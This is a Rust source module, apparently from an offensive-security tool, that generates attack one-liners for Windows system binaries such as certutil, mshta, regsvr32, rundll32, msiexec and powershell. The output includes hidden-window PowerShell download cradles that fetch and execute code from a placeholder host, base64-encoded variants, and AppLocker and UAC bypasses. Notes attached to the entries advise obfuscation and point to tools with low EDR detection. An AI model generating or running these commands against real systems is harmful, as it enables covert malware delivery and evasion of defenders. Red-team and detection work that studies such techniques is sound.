use std::path::Path;

pub struct LolBin {
    pub name: &'static str,
    pub desc: &'static str,
    pub os: &'static str,
    pub note: &'static str,
    pub types: &'static [&'static str],
    pub generate: fn(f: &str, u: &str, a: &str, ext: &str) -> Vec<String>,
}

pub fn b64ps(s: &str) -> String {
    let utf16: Vec<u8> = s.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
    crate::crypto::b64_encode(&utf16)
}

fn ps_cradles(f: &str, u: &str, _a: &str) -> Vec<String> {
    let host_url = if u.is_empty() {
        "http://host/payload.ps1"
    } else {
        u
    };
    let dl_url = if u.is_empty() {
        "http://host/payload"
    } else {
        u
    };
    let enc_cmd = b64ps(&format!("IEX(irm '{}')", host_url));
    vec![
        format!(
            "powershell -ep bypass -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('{}')\"",
            host_url
        ),
        format!("powershell -ep bypass -nop -enc {}", enc_cmd),
        format!(
            "powershell -ep bypass -c \"(New-Object Net.WebClient).DownloadFile('{}','{}')\"",
            dl_url, f
        ),
        format!(
            "powershell -ep bypass -c \"& {{$d=(New-Object Net.WebClient).DownloadData('{}');[IO.File]::WriteAllBytes('{}',$d)}}\"",
            dl_url, f
        ),
    ]
}

fn ps_local_ps1(f: &str) -> Vec<String> {
    vec![
        format!("powershell -ep bypass -nop -w hidden -f \"{}\"", f),
        format!("powershell -ep bypass -nop -c \"& '{}'\"", f),
    ]
}

fn ps_local_exe(f: &str) -> Vec<String> {
    vec![
        format!("powershell -ep bypass -c \"Start-Process '{}'\"", f),
        format!(
            "powershell -ep bypass -c \"[Diagnostics.Process]::Start('{}')\"",
            f
        ),
    ]
}

pub const LOLBINS: &[LolBin] = &[
    LolBin {
        name: "bitsadmin",
        desc: "Background download via BITS service",
        os: "All Windows versions (deprecated but present)",
        note: "Deprecated since Win 7 — use PowerShell BITS cmdlets on modern systems",
        types: &["*"],
        generate: |f, u, _a, _ext| {
            let dl_url = if u.is_empty() {
                "http://host/payload"
            } else {
                u
            };
            let file_name = Path::new(f)
                .file_name()
                .and_then(|s| s.to_str())
                .unwrap_or(f);
            vec![
                format!(
                    "bitsadmin /transfer job /download /priority high \"{}\" \"%TEMP%\\{}\"",
                    dl_url, file_name
                ),
                format!(
                    "bitsadmin /transfer job \"{}\" %TEMP%\\{} & bitsadmin /complete job",
                    dl_url, file_name
                ),
            ]
        },
    },
    LolBin {
        name: "certutil",
        desc: "Download file, decode Base64/hex, or execute",
        os: "All Windows versions",
        note: "Network traffic to non-cert URLs is flagged by many EDRs — use with caution",
        types: &[".exe", ".dll", ".b64", ".hex", "*"],
        generate: |f, u, _a, _ext| {
            let dl_url = if u.is_empty() {
                "http://host/payload"
            } else {
                u
            };
            vec![
                format!("certutil.exe -urlcache -split -f \"{}\" {}", dl_url, f),
                format!("certutil.exe -decode {} output.exe", f),
                format!("certutil.exe -decodehex {} output.exe", f),
                format!("certutil.exe -verifyctl -f -split \"{}\"", dl_url),
            ]
        },
    },
    LolBin {
        name: "cmstp",
        desc: "Execute INF file — UAC bypass + AppLocker bypass",
        os: "All Windows versions",
        note: "⚠ UAC bypass variant patched in some builds. Execution still works without UAC bypass",
        types: &[".inf"],
        generate: |f, _u, _a, _ext| {
            vec![
                format!("cmstp.exe /s /ns {}", f),
                format!("cmstp.exe /au {}", f),
            ]
        },
    },
    LolBin {
        name: "cscript",
        desc: "Execute script files",
        os: "All Windows versions",
        note: "Windows Script Host may be disabled via GPO in hardened environments",
        types: &[".vbs", ".js", ".wsf"],
        generate: |f, _u, _a, _ext| vec![format!("cscript.exe //nologo {}", f)],
    },
    LolBin {
        name: "forfiles",
        desc: "Execute command via file search — cmd.exe bypass",
        os: "All Windows versions",
        note: "Good cmd.exe alternative when cmd is restricted. Low monitoring",
        types: &["*"],
        generate: |f, _u, _a, _ext| {
            vec![
                format!(
                    "forfiles /p C:\\Windows\\System32 /m notepad.exe /c \"{}\"",
                    f
                ),
                format!(
                    "forfiles /p C:\\Windows\\System32 /m calc.exe /c \"cmd /c {}\"",
                    f
                ),
            ]
        },
    },
    LolBin {
        name: "ieexec",
        desc: "Download and execute via Internet Explorer engine",
        os: "⚠ Requires Internet Explorer — removed in Win 11. Works on Win 10 and earlier",
        note: "Rarely monitored when present, but IE removal makes this increasingly rare",
        types: &["*"],
        generate: |_f, u, _a, _ext| {
            let dl_url = if u.is_empty() {
                "http://host/payload.exe"
            } else {
                u
            };
            vec![format!("ieexec.exe {}", dl_url)]
        },
    },
    LolBin {
        name: "installutil",
        desc: "Execute .NET assembly — bypasses AppLocker",
        os: "All Windows versions with .NET Framework",
        note: "Assembly must implement System.Configuration.Install.Installer",
        types: &[".exe", ".dll"],
        generate: |f, _u, _a, ext| {
            if ext == ".dll" {
                vec![format!(
                    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U {}",
                    f
                )]
            } else {
                vec![
                    format!(
                        "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U {}",
                        f
                    ),
                    format!(
                        "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U {}",
                        f
                    ),
                ]
            }
        },
    },
    LolBin {
        name: "mshta",
        desc: "Execute HTA application — bypasses AppLocker",
        os: "All Windows versions",
        note: "Often blocked by ASR rule: Block all Office applications from creating child processes",
        types: &[".hta", ".sct", ".vbs"],
        generate: |f, u, _a, ext| {
            let target = if u.is_empty() { f } else { u };
            if ext == ".sct" {
                vec![format!("mshta.exe \"{}\"", target)]
            } else if ext == ".vbs" {
                vec![format!(
                    "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"{}\"\":close\")",
                    f
                )]
            } else {
                vec![
                    format!("mshta.exe {}", f),
                    format!("mshta.exe \"{}\"", target),
                    format!(
                        "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"{}\"\":close\")",
                        f
                    ),
                ]
            }
        },
    },
    LolBin {
        name: "msiexec",
        desc: "Install/execute MSI package locally or from URL",
        os: "All Windows versions",
        note: "Remote URL installs may require SMB/HTTP — UAC prompt possible without /quiet",
        types: &[".msi"],
        generate: |f, u, _a, _ext| {
            let target = if u.is_empty() {
                "http://host/payload.msi"
            } else {
                u
            };
            vec![
                format!("msiexec /quiet /i {}", f),
                format!("msiexec /quiet /i \"{}\"", target),
                format!("msiexec /q /i {} TRANSFORMS=evil.mst", f),
            ]
        },
    },
    LolBin {
        name: "odbcconf",
        desc: "Execute DLL via ODBC config action",
        os: "All Windows versions",
        note: "Low detection rate — rarely monitored. DLL must export DllRegisterServer",
        types: &[".dll", ".rsp"],
        generate: |f, _u, _a, ext| {
            if ext == ".rsp" {
                vec![format!("odbcconf.exe /f {}", f)]
            } else {
                vec![
                    format!("odbcconf.exe /a {{{{REGSVR {}}}}}", f),
                    format!("odbcconf.exe /s /a {{{{REGSVR {}}}}}", f),
                ]
            }
        },
    },
    LolBin {
        name: "pcalua",
        desc: "Execute via Program Compatibility Assistant",
        os: "All Windows versions",
        note: "Very low detection — rarely in EDR rule sets. No network capability",
        types: &["*"],
        generate: |f, _u, _a, _ext| {
            vec![
                format!("pcalua.exe -a {}", f),
                format!("pcalua.exe -a {} -d C:\\Windows\\System32", f),
            ]
        },
    },
    LolBin {
        name: "powershell",
        desc: "Download cradles and execution one-liners",
        os: "All Windows versions",
        note: "ScriptBlock logging and AMSI active on Win 10+. Use -enc and obfuscation",
        types: &["*", ".ps1", ".exe", ".dll"],
        generate: |f, u, a, ext| {
            if ext == ".ps1" {
                ps_local_ps1(f)
            } else if ext == ".exe" {
                ps_local_exe(f)
            } else {
                ps_cradles(f, u, a)
            }
        },
    },
    LolBin {
        name: "regasm",
        desc: "Execute .NET assembly via COM registration",
        os: "All Windows versions with .NET Framework",
        note: "DLL must implement a COM-registerable class. Low detection rate",
        types: &[".dll"],
        generate: |f, _u, _a, _ext| {
            vec![
                format!(
                    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe /U {}",
                    f
                ),
                format!(
                    "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe /U {}",
                    f
                ),
            ]
        },
    },
    LolBin {
        name: "regsvcs",
        desc: "Execute .NET DLL via COM+ Services",
        os: "All Windows versions with .NET Framework",
        note: "Similar to regasm — requires COM+ compatible DLL",
        types: &[".dll"],
        generate: |f, _u, _a, _ext| {
            vec![format!(
                "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe {}",
                f
            )]
        },
    },
    LolBin {
        name: "regsvr32",
        desc: "Register/execute DLL or remote scriptlet (squiblydoo)",
        os: "All Windows versions",
        note: "Classic AppLocker bypass — ASR rules may block on Defender ATP",
        types: &[".dll", ".sct"],
        generate: |f, u, _a, ext| {
            if ext == ".sct" {
                let target = if u.is_empty() { f } else { u };
                vec![
                    format!("regsvr32.exe /s /n /u /i:{} scrobj.dll", f),
                    format!("regsvr32.exe /s /n /u /i:{} scrobj.dll", target),
                ]
            } else {
                vec![
                    format!("regsvr32.exe /s {}", f),
                    format!("regsvr32.exe /s /u {}", f),
                ]
            }
        },
    },
    LolBin {
        name: "rundll32",
        desc: "Execute DLL export or scriptlet via COM",
        os: "All Windows versions",
        note: "Monitored heavily — combine with obfuscation",
        types: &[".dll", ".sct", ".hta"],
        generate: |f, _u, a, ext| {
            let entry = if a.is_empty() { "EntryPoint" } else { a };
            if ext == ".sct" {
                vec![format!(
                    "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";GetObject(\"script:{}\")",
                    f
                )]
            } else if ext == ".hta" {
                vec![format!(
                    "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"{}\")",
                    f
                )]
            } else {
                vec![
                    format!("rundll32.exe {},{}", f, entry),
                    format!(
                        "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:{}\")",
                        f
                    ),
                ]
            }
        },
    },
    LolBin {
        name: "wmic",
        desc: "Execute XSL transform or process creation",
        os: "⚠ Removed in Win 11 22H2+ and Server 2025. Works on Win 10, Server 2016/2019/2022",
        note: "Use full path: C:\\Windows\\System32\\wbem\\wmic.exe on older builds",
        types: &[".xsl", ".exe", ".sct"],
        generate: |f, u, _a, ext| {
            let target = if u.is_empty() { f } else { u };
            if ext == ".exe" {
                vec![
                    format!("wmic process call create \"{}\"", f),
                    format!("wmic /node:127.0.0.1 process call create \"{}\"", f),
                ]
            } else if ext == ".sct" {
                vec![format!("wmic process get brief /format:\"{}\"", target)]
            } else {
                vec![
                    format!("wmic process get brief /format:\"{}\"", f),
                    format!("wmic process get brief /format:\"{}\"", target),
                    format!("wmic os get /format:\"{}\"", f),
                ]
            }
        },
    },
    LolBin {
        name: "wscript",
        desc: "Execute script files (GUI host)",
        os: "All Windows versions",
        note: "Windows Script Host may be disabled via GPO in hardened environments",
        types: &[".vbs", ".js", ".wsf"],
        generate: |f, _u, _a, _ext| vec![format!("wscript.exe //nologo {}", f)],
    },
];

pub fn get_lolbin(name: &str) -> Option<&'static LolBin> {
    LOLBINS.iter().find(|lb| lb.name.eq_ignore_ascii_case(name))
}
